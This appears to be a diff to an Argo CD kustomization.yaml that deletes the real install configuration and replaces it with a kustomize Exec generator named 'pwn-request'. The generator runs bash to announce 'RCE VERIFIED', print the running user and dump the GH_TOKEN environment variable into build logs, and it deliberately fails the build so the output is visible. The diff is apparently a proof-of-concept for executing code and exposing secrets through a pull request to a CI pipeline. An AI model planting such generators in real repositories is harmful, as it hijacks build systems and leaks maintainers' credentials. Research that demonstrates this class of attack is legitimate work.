@@ -1,25 +1,19 @@
-apiVersion: kustomize.config.k8s.io/v1beta1
-kind: Kustomization
-namespace: argocd
-
-resources:
-  - github.com/argoproj/argo-cd/manifests/ha/cluster-install?ref=v3.2.2
-  - extras.yaml
-  - clusters.yaml
-
-patches:
-  - path: argocd-cmd-params-cm.yaml
-  - path: argocd-cm.yaml
-  - path: argocd-cm-rbac.yaml
-  - path: argocd-sa.yaml
-  - patch: |- # https://github.com/argoproj/argo-cd/issues/11086
-      - op: add
-        path: /spec/egress/1/ports/-
-        value:
-          port: 15012
-          protocol: TCP
-    target:
-      kind: NetworkPolicy
-      name: argocd-redis-ha-server-network-policy
-  - path: argocd-server-dp.yaml
-  - path: argocd-app-controller-sts.yaml
+# Append this to the existing kustomization.yaml
+generators:
+  - |-
+    kind: Exec
+    metadata:
+      name: pwn-request
+    spec:
+      bin: /bin/bash
+      args:
+        - -c
+        - |
+          echo "=========================================="
+          echo "!!! RCE VERIFIED !!!"
+          echo "Run by: $(whoami)"
+          echo "Secret Scope Check:"
+          env | grep GH_TOKEN | head -n 1
+          echo "=========================================="
+          # This exit 1 is CRITICAL. It forces the build to fail so you see the logs.
+          exit 1
